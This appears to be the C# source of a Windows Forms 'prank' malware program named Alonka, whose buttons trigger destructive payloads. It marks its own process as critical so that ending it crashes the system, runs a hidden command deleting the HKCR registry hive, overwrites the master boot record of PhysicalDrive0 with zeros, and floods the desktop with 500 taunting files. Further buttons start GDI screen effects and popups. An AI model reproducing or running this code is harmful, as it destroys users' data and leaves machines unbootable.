using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System;

namespace Alonka;

public partial class Main : Form
{
    // Registration DLL
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
        ref int processInformation, int processInformationLength);
        
    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        
    [DllImport("kernel32")]
    private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberBytesWritten, IntPtr lpOverlapped);
        
    public Main()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        var isCritical = 1;
        const int breakOnTermination = 0x1D;

        Process.EnterDebugMode();
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, breakOnTermination, ref isCritical, sizeof(int));
    }

    private void button2_Click(object sender, EventArgs e)
    {
        var regKill = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            WindowStyle = ProcessWindowStyle.Hidden,
            Arguments = @"/k reg delete HKCR /f"
        };
        Process.Start(regKill);
    }

    private void button3_Click(object sender, EventArgs e)
    {
        const uint genericAll = 0x10000000;
        const uint fileShareRead = 0x1;
        const uint fileShareWrite = 0x2;
        const uint openExisting = 0x3;
        const uint mbrSize = 512u;

        var mbrData = new byte[512];
        var mbr = CreateFile("\\\\.\\PhysicalDrive0", genericAll, fileShareRead | fileShareWrite, IntPtr.Zero, 
            openExisting, 0, IntPtr.Zero);
        WriteFile(mbr, mbrData, mbrSize, out var lpNumberOfBytesWritten, IntPtr.Zero);
            
    }

    private void button4_Click(object sender, EventArgs e)
    {
        var desktopFiles = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        File.WriteAllText(desktopFiles + @"\ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA.txt",
            "WELCOME TO THE HELL." + Environment.NewLine + "How do you clean it all?" + Environment.NewLine + "I wonder if you have free time to delete all this." + Environment.NewLine + "" + Environment.NewLine + "GOOD LUCK.");
           
        for (var s = 1; s < 500; s++) 
        {
            File.Copy(desktopFiles + @"\ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA.txt", 
                desktopFiles + $"\\ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA_ALENKA({s}).txt");
        }
    }

    private void button5_Click(object sender, EventArgs e)
    {
        var game = new CrabGame();
        new Thread(() => game.ShowDialog()).Start();
    }

    private void button6_Click(object sender, EventArgs e)
    {
        new Thread(Effect.GDI_payloads).Start();
    }

    private void sms_Click(object sender, EventArgs e)
    {
        var popup = new Popup();
        new Thread(() => popup.ShowDialog()).Start();
    }
}
